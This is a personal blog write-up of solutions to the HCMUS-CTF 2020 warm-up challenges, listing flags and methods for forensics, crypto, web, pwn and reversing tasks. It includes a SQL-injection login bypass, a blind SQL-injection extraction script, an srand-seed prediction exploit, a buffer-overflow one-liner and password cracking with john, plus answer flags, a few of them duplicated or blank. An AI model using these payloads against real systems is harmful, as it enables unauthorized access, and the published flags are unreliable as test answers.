---
layout: distill
title: Write-up for HCMUS-CTF Warm-Up Stage
date: 2020-06-11
description:
tags: math
categories:
giscus_comments: true 
---

## Misc

### Kick-off (10pts)

```
Just submit the flag: HCMUS-CTF{here_we_go_hcmus_ctf_by_fit@hcmus}
```

Just do what it say.

**==>** `HCMUS-CTF{here_we_go_hcmus_ctf_by_fit@hcmus}` **<==**

### Fanpage (10pts)

```
I know you've already followed our fanpage =D
```

Just check the posts on the fanpage (you need not actually follow it). [This one](https://www.facebook.com/hcmus.ctf/posts/120502073008331), to be more specific.

**==>** `HCMUS-CTF{y0ur_v3rY_f1rst_Flagggggggggggggg}` **<==**

### Logo (50pts)

```
Hmmm, a client has complained that our website is f*cking ugly. Hey, we are hackers, not developers. There is no formal at all. The only thing you need to know is ETHICAL.
```

As the title suggests, check the [logo](https://ctf.hcmus.edu.vn/files/5cb899f198c05639132f5da2061aedde/Logo.png) but on a light-colored background to see the hidden flag blended in the website color.

Like this:

{% include figure.html path="assets/img/2020-06-11_images/Logo.png" class="img-fluid" zoomable=true %}

**==>** `HCMUS-CTF{this_is_a_function_not_a_bug_at_all}` **<==**

### Discord (50pts)

```
Hey guys! Join our discord channel and you will have the flag ;)
```

Too bad this time you need to actually join the [Discord](https://discord.gg/yhr5KCs) and check the `general` channel.

But, there is a catch. The description gives `HCMUS-CTF{089 111 085 095 107 110 060 062 119 095 100 105 115 099 111 114 068 095 064 110 100 095 085 095 075 110 048 119 095 065 083 067 073 073}`. It is obviously (not quite, I submitted it and got Wrong) another layer of encryption. Those are the ordinal of ASCII characters.

**==>** `HCMUS-CTF{YoU_kn<>w_discorD_@nd_U_Kn0w_ASCII}` **<==**

## Forensics

### Liberate (50pts)

```
30/04/1975
File: 30_4.jpg
```

Use `exiftool 30_4.jpg` to get 2 clues:

- `84-*O;_:@97XK8VARo.6;aX,J3&P&SDI[TqATE2` in Comment; and
- `Base85` in Description.

It is obvious (again, not obvious, I missed Base85 so I just tried everything) you should find a Base85 (in face, ASCII85 might be a more popular name) decoder ([here](https://cryptii.com/pipes/ascii85-encoding) for an example).

**==>** `HCMUS-CTF{uSed_ASCII85_encoder}` **<==**

### Workers' Day (50pts)

```
1/5/2020
File: iwd_e.jpg
```

Use `steghide extract -sf iwd_e.jpg` to extract the flag to `flag.txt`.

**==>** `HCMUS-CTF{simply_use_steghide_to_hiding_something}` **<==**

### AtLeast (50pts)

```
Uncover me, please! We have secret communication, so we need to make it transparent.

File: fake.png
```

Use `zsteg fake.png` to get `Nothing much, I can write a long long text, but in short, I think it's a flag HCMUS-CTF{there_is_somthing_I_wanna_hide}`

**==>** `HCMUS-CTF{there_is_somthing_I_wanna_hide}` **<==**

### Galaxy (100pts)

```
Enjoy the music :)

https://drive.google.com/open?id=1tfJYN6wwd-yoAfnfVl-eNBKbbh6HQBxa
```

Use `audacity` to load the WAV file. It is common to hide the message in the Spectrogram format so we switch to that view. Check 1:41 to 1:47. Voila?

{% include figure.html path="assets/img/2020-06-11_images/galaxy.png" class="img-fluid" zoomable=true %}

**==>** `HCMUS-CTF{sound_likes_Outer_Space}` **<==**

### InsideMe (100pts)

```
Ok! Try to beat my Yoda!

File: yoda_super.jpg
```

For some who-know reasons, `binwalk -e yoda_super.jpg` does not reveal anything. However, `hexdump -C yoda_super.jpg` shows something additional data at the end of the file, apparently there **is** a RAR file inside (why didn't binwalk find this?). Using `hexdump -C yoda_super.jpg  | less +/"52 61"` and `dd if=yoda_super.jpg of=yoda.zip skip=193301 bs=1` I was able to get the RAR part, but it is broken (oh wait or did I not install rar). Using [extract.me](https://extract.me/) to extract gives two files:

1. `secret.rtf` says "Not here" (nice joke)
2. `light.pdf` is unreadable (as a PDF).

I was desperate until I was going to upload the file to an online PDF fixing tool when suddenly the Preview of the upload dialogue revealed that it was an image with the flag inside.

**==>** `HCMUS-CTF{sound_likes_Outer_Space}` **<==**

### unknown (100pts)

```
Their computer was hacked, they tried to send us some clue but there are some corruptions on the transmission!!! hmm...

File: unknown
```

Now this one is real funny. `hexdump -C unknown` shows that it is a PNG image. However it is corrupted somehow. Normal people might use [PCRT](https://github.com/sherlly/PCRT) for this b...but... I used [this non-free service](https://online.officerecovery.com/pixrecovery/) instead. And it gave me a watermarked version. Luckily I was able to make out the flag (can you?).

{% include figure.html path="assets/img/2020-06-11_images/unknown.png" class="img-fluid" zoomable=true %}

**==>** `HCMUS-CTF{l0l_CMU_da_b3s}` **<==**

### Docker Babe (100pts)

```
Ahhhhhhhh! I have a docker, I have an image... Ahhhhhhhhhhhhhhhhhh! Flagggggggggggggggggggg =]]]]]

Anyway, your image: https://hub.docker.com/r/pakkunandy/docker-babe
```

Yeah... just `docker pull https://hub.docker.com/r/pakkunandy/docker-babe` then `docker run -it pakkunandy/docker-babe`. You can `cat flag.txt` inside to get the flag.

**==>** `HCMUS-CTF{Docker_Is_an_essential_tool_You_have_to_learn_FORRRRSURRREEEE}` **<==**

### Crime (150pts)

```
Can you catch the murderer?

https://drive.google.com/open?id=1dq11MIEI8wzP1o7m3l9tDpfxzQXW1ygt
```

Looks like a broken something, meh. I used `dd if=CRIME.001 of=CRIME.PNG skip=3702784 bs=1` to extract the PNG (and other things), then `dd if=CRIME.PNG of=CRIME.ZIP skip=4096 bs=1` to extract the ZIP. But I could not unzip it since some compression errors. Google searching shows that it is a 7Z file. Then I only needed to know the password.

`rockyou.txt` did not help. I was stuck. Some googling finally showed that it was the Zodiac code, everything clicked (Zodiac killer and Crime?). The password was `FITPASS`.

**==>** `HCMUS-CTF{social_distancing_for_this_pandamic}` **<==**

### Actual_At_Least (150pts)

```
I like Row, and I like Red. But at least, I tried :)

File: at-least-you-tried1366758-prints_1.jpg
```

Using [stegsolve](https://en.kali.tools/all/?tool=1762) and extracting the red bit by row (get it?), you can see the flag.

**==>** `HCMUS-CTF{You_shoud_learn_LSB_embeded_system}` **<==**

### Qemu (150pts)

```
Forget VMWare or Virtualbox =D Here is your machine! Booooooot thissssss Be patient :)

The admin also told us the password IS ON YOUR LOG-IN screen!

https://drive.google.com/file/d/1OUb9KSNeqrIRF6ZugHaPA0EHq0mHWtsR/view?usp=sharing
```

Using [qemu](http://qemu.org) to boot that file, you find yourself at the logging screen (after like 15 minutes) with no idea what the password was. You try the most obvious answer that is on your screen (as the problem description suggested): `HCMUS-CTF`. Inside, you can easily find the flag.

**==>** `` **<==**

## Cryptography

### Decoder (50pts)

```
I think the decoder is an essential technique you need to know. SSB0aGluayB0aGUgZmxhZyBpcyBlbmNvZGVkIGluIGJhc2UoNjQvMik6IEpCQlUyVktURlZCVklSVDNOSktYRzVDN0tOVVcyNERNSVZQVUlaTERONVNHSzRUNQ==
```

`==` at the end clearly (aga-.. oh nvm) suggests Base64. Decoding gives `I think the flag is encoded in base(64/2): JBBU2VKTFVBVIRT3NJKXG5C7KNUW24DMIVPUIZLDN5SGK4T5`. 64/2=32 so...

**==>** `HCMUS-CTF{jUst_SimplE_Decoder}` **<==**

### Dot and Underscore (50pts)

```
It's extremely easy :) Remember put the content inside HCMUS-CTF{...}

When you were young, I think you knew this one: .. - ... --. --- --- -.. - --- .-.. . .- .-. -. -- --- .-. ... . -.-. --- -.. .
```

It was obvious (this time it really was) that this is Morse code: `ITSGOODTOLEARNMORSECODE`.

**==>** `HCMUS-CTF{ITSGOODTOLEARNMORSECODE}` **<==**

### sub (50pts)

```
I think you should read that report in a different way :)

File: sub
```

The report says

```
MIT YAEWSMB GY OFYGKDAMOGF MTEIFGSGUB (YOM) GY IEDWL CAL TLMAZSOLITR OF YTZKWAKB 1995 ZALTR GF MIT EGDHWMTK LEOTFET RTHAKMDTFM GY MIT YAEWSMB GY DAMITDAMOEL - IG EIO DOFI EOMB WFOXTKLOMB GY LEOTFET. AYMTK 15 BTAKL, MIT YAEWSMB IAL TVHAFRTR EGFLORTKAZSB AFR OL EWKKTFMSB LWHHGKMTR ZB MIT UGXTKFDTFM MG ZTEGDT GFT GY MIT QTB YAEWSMOTL GY OFYGKDAMOGF MTEIFGSGUB OF XOTMFAD.

AM HKTLTFM, YOM IAL 6 RTHAKMDTFML: UTFTKAS OFYGKDAMOEL, EGDHWMTK FTMCGKQ AFR MTSTEGDDWFOEAMOGF, QFGCSTRUT TFUOFTTKOFU, EGDHWMTK LEOTFET, OFYGKDAMOGF LBLMTD, AFR LGYMCAKT TFUOFTTKOFU. OF HAKMOEWSAK, MIT RTHAKMDTFM GY UTFTKAS OFYGKDAMOEL OL OF EIAKUT GY MTAEIOFU ZALOE AFR ZAEQUKGWFR OM QFGCSTRUT YGK ASS WFOXTKLOMB LMWRTFML, MIT GMITK 5 RTHAKMDTFML AKT OF EIAKUT GY HKGYTLLOGFAS QFGCSTRUT OF ROYYTKTFM DAPGKL GY OM.

MIT AEARTDOE LMAYY DTDZTKL AKT HKGYTLLGKL, LTFOGK STEMWKTKL, STEMWKTKL, MTAEIOFU ALLOLMAFML, AFR DAFB XOLOMOFU HKGYTLLGKL AFR STEMWKTKL YKGD GMITK WFOXTKLOMOTL, KTLTAKEI OFLMOMWMTL, AFR OFRWLMKB OF XOTMFAD GK AZKGAR. MIT MGMAS FWDZTK GY AEARTDOE AFR FGF-AEARTDOE LMAYY OL AZGWM 128 DTDZTKL (TVESWROFU MIGLT EWKKTFMSB LMWRBOFU AZKGAR).

DOLLOGF, XOLOGF AFR GZPTEMOXT

AL A YAEWSMB GY IEDWL, MIT DOLLOGF GY YOM OL MG AEIOTXT MIT DOLLOGF GY MIT WFOXTKLOMB OF MIT YOTSR GY OFYGKDAMOGF MTEIFGSGUB AL YGSSGCL:

HKGXOROFU WFRTKUKARWAMT, HGLMUKARWAMT EGWKLTL, HTKYGKDOFU LEOTFMOYOE KTLTAKEI AFR MKAFLYTKKOFU MTEIFGSGUOTL OF OFYGKDAMOGF MTEIFGSGUB MG MIT OFRWLMKB.
HKGXOROFU TVHTKML OF OFYGKDAMOGF MTEIFGSGUB, LAMOLYBOFU RGDTLMOE RTDAFRL OF TEGFGDOE AFR LGEOAS RTXTSGHDTFM, AFR QTTHOFU WH COMI OFMTKFAMOGFAS RTXTSGHDTFM MKTFRL.

ITKT OL MIT YSAU YGK BGW, KTDTDZTK HWM OM OFLORT IEDWL-EMY{...}: BGW_LIGWSR_STAKF_A_ZOM_IOLMGKB_GY_YOM
```

Looking like a substitution cipher aren't we. Using [this page](https://www.guballa.de/substitution-solver) we get

```
THE FACULTY OF INFORMATION TECHNOLOGY (FIT) OF HCMUS WAS ESTABLISHED IN FEBRUARY 1995 BASED ON THE COMPUTER SCIENCE DEPARTMENT OF THE FACULTY OF MATHEMATICS - HO CHI MINH CITY UNIVERSITY OF SCIENCE. AFTER 15 YEARS, THE FACULTY HAS EXPANDED CONSIDERABLY AND IS CURRENTLY SUPPORTED BY THE GOVERNMENT TO BECOME ONE OF THE KEY FACULTIES OF INFORMATION TECHNOLOGY IN VIETNAM.

AT PRESENT, FIT HAS 6 DEPARTMENTS: GENERAL INFORMATICS, COMPUTER NETWORK AND TELECOMMUNICATION, KNOWLEDGE ENGINEERING, COMPUTER SCIENCE, INFORMATION SYSTEM, AND SOFTWARE ENGINEERING. IN PARTICULAR, THE DEPARTMENT OF GENERAL INFORMATICS IS IN CHARGE OF TEACHING BASIC AND BACKGROUND IT KNOWLEDGE FOR ALL UNIVERSITY STUDENTS, THE OTHER 5 DEPARTMENTS ARE IN CHARGE OF PROFESSIONAL KNOWLEDGE IN DIFFERENT MAJORS OF IT.

THE ACADEMIC STAFF MEMBERS ARE PROFESSORS, SENIOR LECTURERS, LECTURERS, TEACHING ASSISTANTS, AND MANY VISITING PROFESSORS AND LECTURERS FROM OTHER UNIVERSITIES, RESEARCH INSTITUTES, AND INDUSTRY IN VIETNAM OR ABROAD. THE TOTAL NUMBER OF ACADEMIC AND NON-ACADEMIC STAFF IS ABOUT 128 MEMBERS (EXCLUDING THOSE CURRENTLY STUDYING ABROAD).

MISSION, VISION AND OBJECTIVE

AS A FACULTY OF HCMUS, THE MISSION OF FIT IS TO ACHIEVE THE MISSION OF THE UNIVERSITY IN THE FIELD OF INFORMATION TECHNOLOGY AS FOLLOWS:

PROVIDING UNDERGRADUATE, POSTGRADUATE COURSES, PERFORMING SCIENTIFIC RESEARCH AND TRANSFERRING TECHNOLOGIES IN INFORMATION TECHNOLOGY TO THE INDUSTRY.
PROVIDING EXPERTS IN INFORMATION TECHNOLOGY, SATISFYING DOMESTIC DEMANDS IN ECONOMIC AND SOCIAL DEVELOPMENT, AND KEEPING UP WITH INTERNATIONAL DEVELOPMENT TRENDS.

HERE IS THE FLAG FOR YOU, REMEMBER PUT IT INSIDE HCMUS-CTF{...}: YOU_SHOULD_LEARN_A_BIT_HISTORY_OF_FIT
```

**==>** `HCMUS-CTF{YOU_SHOULD_LEARN_A_BIT_HISTORY_OF_FIT}` **<==**

### Factorization Revenge (50pts)

```
Long is creating an RSA key pair to secure his network. He isn't sure if his key is good enough or not. Can you help him?

File: chal.py
```

W...wait this should be put under `Factorization`.

### Xor (100pts)

```
I have used XOR to encrypt the message! Oh, it's cool. Unfortunately, I lost my key. But why do I need to remember the key when I know something in plaintext? meh

e0a19131a79051d123d113b14166535163519023d280d0b290f0b053b2d363d3b3b
```

I suppose this will be decrypted to be the flag, so the begining should be `HCMUS-CTF{`. Using [this](https://www.dcode.fr/xor-cipher) to "solve" it gives rubbishes. Why? Oh wait its length is odd? That's odd? Let's add 0 at the end. Nope, not helping. How about at the start? Wow, a repeating `FIT`. Maybe that is the key.

**==>** `HCMUS-CTF{XoR_1s_a_KinD_oF_Crypto}` **<==**

### The Ripper (100pts)

```
If you use linux, you should know two important files :) Can you crack it! John can help you a hand...

nc 159.65.13.76 33001

File: shadow
File: passwd
```

First time hearing about those two files though. And who the hell is John?

Joke aside, following the step [here](https://alran.github.io/ctf-writeups/pages/heres-johnny.html) gives me the flag. First, install `john` (apt-get) or use Kali. Secondly, run `unshadow passwd shadow > mypasswd` then `john mypasswd --show`. You will get `john:secret:1003:1003:John,,,:/home/john:/bin/bash`. It was that easy. Now just netcat and enjoy the flag.

**==>** `HCMUS-CTF{Use_John_the_ripper_to_crack_password_is_fun!!!HAHAHA}` **<==**

### Factorization (150pts)

```
RSA is weak if you use small prime :)

Here is your ciphertext: 27039685590612119275089010235300223759019803357397398877100224864989993317282

File: pub_gen.py
File: publickey.pem
```

Yeah, small prime. I actually followed [this process](https://www.cryptool.org/en/cto-highlights/rsa-step-by-step) for this RSA problem. Also, I used [this](https://www.alpertron.com.ar/ECM.HTM) for factorization and [this](https://www.dcode.fr/modular-inverse) for finding modular inverse.

**==>** `HCMUS-CTF{smaLL_NumbeR}` **<==**

### Factorization Revenge (50pts)

```
Long is creating an RSA key pair to secure his network. He isn't sure if his key is good enough or not. Can you help him?

File: chal.py
```

[This blog](https://drx.home.blog/2019/03/01/crypto-rsa/) especially the `Attack 3 – Fermat Attack (p and q are too close)` section gives a good source code for factorizing $n$. The rest is simple.

**==>** `HCMUS-CTF{smaLL_NumbeR}` **<==**

### Very Secure RSA (150pts)

```
This is another message encrypted using RSA. Can you break it? Muaaaaahhhhh!!!!

File: chal.py
```

Is there a difference between this and Factorization Revenge?

**==>** `HCMUS-CTF{c775e7b757ede630cd0aa1113bd102661ab38829ca52a6422ab782862f268646}` **<==**

### smalleeeee (200pts)

```
I know you've mastered RSA. You know the way to encrypt the password with RSA right?. I just add a little step to spice up a password with XOR before it comes to RSA...

It seems the public key of RSA has some weaknesses...

File: xorkey
File: publickey.pem
File: key.enc
```

Now this seems different. Check `Attack 2 – Small e, small m` of [this blog](https://drx.home.blog/2019/03/01/crypto-rsa/). Then just XOR the message with the xor key.

Also, remove the z's. But I wonder why?

**==>** `HCMUS-CTF{hello_from_the_other_side}` **<==**

## Web

### Baby Sql (50pts)

```
Nooo, it seems like I can't hide my treasure string from the most elite hackers at HCMUS, now I created a website using SQL to store my beloved string. No one except me know the password muawahahahaha

http://159.65.13.76:1339/
```

Looks like it is up for some SQL Injection.

```sql
Username: admin
Password: ' OR '1'='1
```

**==>** `HCMUS-CTF{Sh0uld_N0tz_Conc4ten4te_S+r1ng_SQQLLL}` **<==**

### Secret Agency (50pts)

```
I heard that only the right device can view the secret.

http://159.65.13.76:1337/
```

Viewing page source shows that the secret agent is `eevee` (you little monster).

```bash
http GET http://159.65.13.76:1337/  User-Agent:"eevee"
```

**==>** `HCMUS-CTF{+he_4g3nt_Izzz_eevoolution0123456}` **<==**

### Blind SQL (200pts)

```
Hmm, in the last problem I created an authentication web but get passed by hackers, how????

In this problem there will be no authentication hahaha, no one can get my beloved treasure anymore.

http://159.65.13.76:1340/
```

To get the case-insensitive version of the password:

```python
import requests
from bs4 import BeautifulSoup
import string
from tqdm import tqdm

final_str = ''

alphabet = list(string.printable)
for x, y in [('%', '\%'), ('_', '\_'), ('{', '\{')]:
    alphabet = [(y if k == x else k) for k in alphabet]

while True:
    for x in alphabet[::-1]:
        cur_str = final_str + x
        req = f"admin' AND 1=(SELECT 1 FROM account WHERE password LIKE '{cur_str}%') -- '"
        r = requests.post('http://159.65.13.76:1340', data={'username': req})

        soup = BeautifulSoup(r.text, 'html.parser')
        if len(soup.find_all('h1', {'class': 'error-login'})) == 0:
            final_str = cur_str
            print(final_str)
            break
```

which results in `sh0uld_i_us3_nosql_n3xt_t1m3_0x3f3f3f`.

Common sense tells you where to put the cases...

Or if you are free...

```python
# ...
flag = list('sh0uld_i_us3_nosql_n3xt_t1m3_0x3f3f3f')

caps = []
def gen_cap(s, i=0):
    global caps
    if i == len(s):
        caps.append(''.join(s))
    else:
        gen_cap(s, i + 1)
        if 'a' <= s[i] <= 'z':
            s[i] = s[i].upper()
            gen_cap(s, i + 1)
            s[i] = s[i].lower()

gen_cap(flag)

for x in tqdm(caps):
        cur_str = 'HCMUS-CTF{' + x + '}'
        req = "admin' AND 1=(SELECT 1 FROM account WHERE BINARY(password) = BINARY('" + cur_str + "')) -- '"
        r = requests.post('http://159.65.13.76:1340', data={'username': req})

        soup = BeautifulSoup(r.text, 'html.parser')
        if len(soup.find_all('h1', {'class': 'error-login'})) == 0:
            final_str = cur_str
            print(final_str)
            break
```

**==>** `HCMUS-CTF{Sh0uld_I_Us3_NoSQL_N3xt_T1m3_0x3f3f3f}` **<==**

## Pwn

### TellMe (50pts)

```
Hey! I think you should log in to this portal =D

nc 159.65.13.76 33100

File: tellme.c
```

Just input the name and password in the file.

**==>** `` **<==**

### Store (150pts)

```
My store is having a special event, called "Guess the right price". Do you want to give a try?

nc 159.65.13.76 33101

File: store
```

Using ghidora to read the source code. It seems like it uses `seed(time(NULL))` to generate 4 random numbers. Nice. We can brute force for the server seed to synchronize this "randomness".

Source code to exploit:

```C++
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

ulong get_random() {
    int i = rand();
    return (ulong)(uint)(i % 0x1e240);
}

int main(int argc, char **argv)
{
 ulong seq[] = {atoi(argv[1]), atoi(argv[2]), atoi(argv[3])};
 time_t t = time(0);
 for(int i = 0; i < 100000000; i++)
 {
  srand(t - i);
  for(int j = 0; j < 3; j++)
  { 
   if(get_random() != seq[j])
   {
    break;
   }
   if(j == 2)
   {
    printf("%d\n", get_random());
    exit(0);
   }
  }
 }
 exit(1);
 return 0;
}
```

As an example, netcat gives:

```
---- Welcome to bicycle store ----
[+] There are a lot of bicycles in this store
[+] Waiting for customer ...
[+] Customer number 1 comes in
[+] He paid 2538 for the green bicycle
[+] Customer number 2 comes in
[+] He paid 122009 for the blue bicycle
[+] Customer number 3 comes in
[+] He paid 6632 for the yellow bicycle
[+] If you guess the price of the 4th bicycle right, I will give you a small gift
[+] How much do you think the 4th bicycle cost ?:
```

Using the source above `./a.out 2538 122009 6632` gives 19797 (which is a correct answer). I wish it was this easy to predict stock prices.

**==>** `HCMUS-CTF{N3v3r_Us3_srand_time_0}` **<==**

### Secret (150pts)

```
Can you guess the flag ? It's not too hard if you know how to do it.

nc 159.65.13.76 33102

File: secret
```

Using ghidora to read the source showed that it checks if the input is the prefix of the flag. So... yeah, probably just type `H`.

**==>** `HCMUS-CTF{strncmp_is_so_fun}` **<==**

### FlowMe (150pts)

```
Flow your mine :)

nc 159.65.13.76 33103

File: flowme.c
File: flowme
```

After checking carefully the registers around where the input is stored, I found out that you can overwrite the return to the winning function at 0x4007ea.

One liner:

```bash
python2 -c "print 'this_is_a_password' + 'a'*246 + '\xea\x07\x40'" | nc 159.65.13.76 33103
```

**==>** `HCMUS-CTF{You_have_to_learn_basic_stack_based_buffer_overflow}` **<==**

## Reverse Engineering

### StackString (50pts)

```
I heard that you can't use strings so solve this challenge. Is it true ?

File: stackstring
```

Check the stack for the flag. Yes, just check it.

**==>** `HCMUS-CTF{St4cK_Str1ng_G00D_old_techn1qu3}` **<==**

### Patient (100pts)

```
You have to buy a hundred computer mouses to solve this challenge ;)

File: Patient.exe
```

Just click. It should not take that much time. At least for a NEET like me.

**==>** **<==**

### z3 (150pts)

```
My friend was stuck while solving this challenge. Can you help him ?

File: z3
```

Using ghidora will give you a mess of C code. But it was just a simple if check (with like 32 equations for 32 variables - length of the flag). By meticulously copying and pasting them into Python (actually I used Replace, lol) to use [z3](https://github.com/Z3Prover/z3), you get the ordinal value representing the ASCII characters of the flag.

If you are interested. Here is the code (magnificient, is it not?):

```python
from z3 import *

x = [Int(f'x{i}') for i in range(0x24)]

s = Solver()

m = solve(
x[0x12] + x[0x18] * -6 - x[4] - x[8] + x[2] * 6 + x[9] * -5 + x[5] * 9 + x[0x1f] * -10 + x[7] * 2 + x[0xf] * 4 + x[0xc] * 2 + x[0x1d] * -5 + x[0] * 3 - x[0xd] + x[0x1a] * 4 - x[0x21] - x[0x13] + x[3] * 9 + x[1] * -7 + x[0xb] * 4 + x[0x23] * 3 + x[0x17] * 9 + x[6] + x[0x1b] * -9 + x[0xe] * -8 + x[10] * -6 + x[0x22] * -4 + x[0x1e] * 10 + x[0x1c] * 10 + x[0x19] * 7 + x[0x20] + x[0x16] * 9 + x[0x15] * -9 + x[0x11] * 8 + x[0x14] * -5 + x[0x14] * -5 == 0x449 ,
x[0x13] * 9 + x[9] * 2 + x[0x11] * -9 + x[0x14] * 8 + x[0x1c] * -4 + x[0x12] * -8 - x[0x1d] + x[3] * -6 + x[0xd] * 10 + x[0x22] * -10 + x[1] * -3 - x[2] + x[0x18] * 5 + x[0x21] * -2 + x[0x23] * -8 + x[0x1b] * -5 + x[0x1a] * 3 + x[10] * 2 + x[0xc] * 5 + x[0x17] * -6 + x[0x16] + x[0x10] * 5 + x[0xe] * 3 + x[0x1f] + x[0xb] * 3 + x[0x19] * -2 + x[0x20] * 7 + x[0x15] * 9 + x[4] * -3 + x[7] * 7 + x[0xf] * -5 + x[8] * 6 + x[6] * 2 + x[0x1e] * -9 + x[0] * 7 == 0xd0 ,
x[0x1e] * 2 + x[3] * -4 + x[0x22] + x[0x17] * 4 + x[0x12] - x[7] + x[0x14] * -5 + x[0x18] * -3 + x[1] * 6 + x[0xd] * -3 + x[10] * -3 + x[0xe] * -6 + x[0x21] * -10 - x[0x1a] + x[0x23] * -6 + x[8] * -5 + x[2] + x[5] * -3 + x[0] * 10 + x[6] * -7 - x[0xc] + x[0x1c] * -10 + x[0x1f] * 8 + x[9] * -2 + x[0xf] * 8 - x[0xf] - x[0x20] + x[0x1b] * -4 + x[0x16] * -3 + x[0x13] * -3 + x[0x19] * 7 + x[0x10] * 2 + x[0x10] + x[0x15] * -4 + x[4] * 6 - x[0xb] == -0xc98 ,
x[10] * -4 + x[0xc] * 8 + x[8] * -7 + x[0xf] * 5 + x[0x1c] * -2 + x[0x22] * -8 + x[5] * -6 + x[0xd] * 8 + x[0x23] * -3 + x[0x1e] * 2 + x[0x11] * 4 + x[3] * 5 + x[0x12] * -3 + x[0x1b] * -5 - x[0xe] + x[0x1d] * -10 + x[0x19] * -4 + x[0x1a] * 6 - x[0x13] + x[0x14] * -5 + x[0xb] * -2 + x[0] * 6 + x[6] * 2 + x[2] * -2 + x[4] * -10 + x[1] * 7 + x[0x17] + -x[0x20] + -x[0x20] + x[7] * 2 - x[0x1f] + x[9] * -2 + x[0x10] * -7 + x[0x15] * 9 + x[0x18] * 4 == -0x615 ,
x[0x1a] * -2 + x[0x20] + x[0x1b] * -9 + x[1] * -9 + x[4] * -9 + x[0x14] * -4 + x[0x10] * -5 + x[0x1d] * -4 + x[0x21] * -2 + x[0x19] * 2 + x[3] * -7 + x[0xb] * -3 + x[0x15] * -3 + x[0x11] * 9 + x[0x1c] * 5 + x[10] * 5 + x[7] * 5 - x[6] + x[0xc] * -10 + x[0] * 7 + x[0x23] * 7 + x[0x22] * 6 + x[0x17] * -3 + x[0x13] * -6 + x[0xe] * -3 + x[0x1f] * -2 + x[2] * 3 - x[8] + x[0xf] * 7 + x[0x1e] * 9 + x[9] * -8 + x[5] * 2 + x[0x12] * 3 + x[0x18] * 5 + x[0xd] * -9 == -0x85c ,
x[0x16] * -9 + x[0x20] * -10 + x[1] * -7 + x[5] * -3 + x[0x1a] * -7 + x[0] * -8 + x[0xc] * 5 + x[6] * -9 + x[0x21] * 6 + x[0x18] * -5 + x[0x23] * 9 + x[0x1b] * 2 + x[7] * -6 + x[0x1f] * -3 + x[0x10] + x[2] * 6 + x[0xe] * -6 + x[0x13] * -9 + x[0x1c] * 7 + x[8] * 3 + x[0x14] * -7 + x[0x17] * 7 + x[0xf] * -3 + x[0x11] + x[0xb] * 8 + x[9] * 10 + x[10] * -4 + x[3] * -2 + x[0x22] * -5 + x[0x12] * 5 + x[0xd] * -2 + x[0x19] * -3 + x[4] * 5 == -0x722 ,
x[0x20] * -6 + x[0x1a] * -7 + x[0x22] * 3 + x[0x21] * -2 + x[0xf] * -6 + x[0] * -8 + x[0x16] * -8 + x[0x1b] * 4 + x[3] * -5 + x[8] + x[0x12] * 10 + x[0x14] * -5 + x[7] * 4 + x[9] * 6 + x[10] * -8 + x[2] * 8 + x[0x1e] * -9 + x[0xe] * 7 + x[0x1d] * 6 + x[0x15] * 10 + x[0xc] * -9 + x[5] + x[0xb] * -6 + x[0x18] * -6 + x[0x1c] * 6 + x[0x1f] * 7 + x[6] * -7 + x[0x17] * -5 + x[0x10] * 3 + x[0x13] + x[0xd] * -2 + x[1] * 5 + x[0x11] * -9 + x[0x19] == -0x968 ,
x[1] * -4 + x[0x12] * 7 + x[0x14] * -6 + x[0xd] * -9 + x[10] * 7 + x[0x15] * 2 + x[0xc] * -4 + x[0x11] * 3 + x[0xe] * 3 + x[4] * 7 + x[7] * 10 + x[3] * -3 + x[0x16] * 4 + x[0x1f] * -5 + x[0x18] * -4 + x[8] * 5 + x[0x17] * 7 + x[2] * 2 + x[0x21] * -2 + x[0xb] * -5 + x[0] * 8 + x[0x1e] * 8 + x[0x1b] * -8 + x[0x22] * -6 + x[0x13] * 7 + x[6] * -5 + x[0x1a] * -3 + x[9] * 10 + x[0x10] * 5 + x[0xf] * 2 + x[0x19] * 10 + x[0x23] * 10 + x[0x20] + x[5] * 5 + x[0x1c] * -4 == 0x145b ,
x[9] * 2 + x[0x11] * -7 + x[0x19] * -10 + x[0xd] * 9 + x[0x1f] * -7 + x[0x13] * 6 + x[0xb] * 8 + x[10] * 3 + x[0x15] * 4 + x[0x16] * 6 + x[0] * 4 + x[0x17] * 6 + x[0x1a] * 10 + x[0x20] * 6 + x[0x23] * 7 + x[0x21] * 2 + x[0x18] + x[0xe] * 10 + x[0x22] * 10 + x[0x1c] * 8 + x[0x12] * -4 + x[8] * 9 + x[0x1b] * 2 + x[6] * 7 + x[0x10] * -2 + x[0x1d] * -4 + x[5] * 2 - x[4] + x[0xf] * -3 + x[0x1e] * 7 + x[0xc] * -6 + x[2] * -2 == 0x14bc ,
x[0x1e] * -6 + x[9] * 3 + x[0x1c] + x[2] * -8 + x[0x20] * 8 + x[3] * -3 + x[0xf] * -9 + x[0xb] * -3 + x[8] * -10 + x[0x1b] * 5 + x[0x15] * 5 + x[0x18] * -5 + x[6] * 4 + x[0xc] + x[0x19] * 2 + x[0x10] * -8 + x[1] * -10 + x[0x22] * -10 + x[0x23] * 5 + x[0xd] * 9 + x[0] * -2 + x[0x12] * 4 + x[0x1d] + x[0x16] * -10 + x[0x1f] * 6 + x[4] * -2 + x[5] * 6 + x[0xe] * 6 + x[0x17] * 5 + x[0x1a] * 4 + x[0x14] * 6 + x[10] * 7 + x[0x21] * -10 + x[7] == -0xe2 ,
x[5] * 4 + x[1] * 7 + x[0] * 7 + x[2] * -7 + x[0x10] * 4 + x[0x15] * -3 + x[0x14] * 10 + x[0x22] * 4 + x[0x1e] * -6 + x[0x17] * 8 + x[0x11] + x[10] * -4 + x[0x13] * -8 + x[6] * -4 + x[0x21] * 5 - x[0x1d] + x[4] * 2 + x[9] * 9 + x[0x1c] * -9 + x[0xd] * -7 + x[0xe] * 7 + x[0x1b] * 4 + x[7] * -10 - x[0x23] + x[0xb] * 5 + x[0x12] * -3 + x[0x16] * -8 + x[0x18] * -7 + x[8] * -4 + x[0x20] + x[0xf] * 8 - x[0xf] + x[0xc] * -5 + x[0x1a] * 9 + x[3] * 10 == 0x68a ,
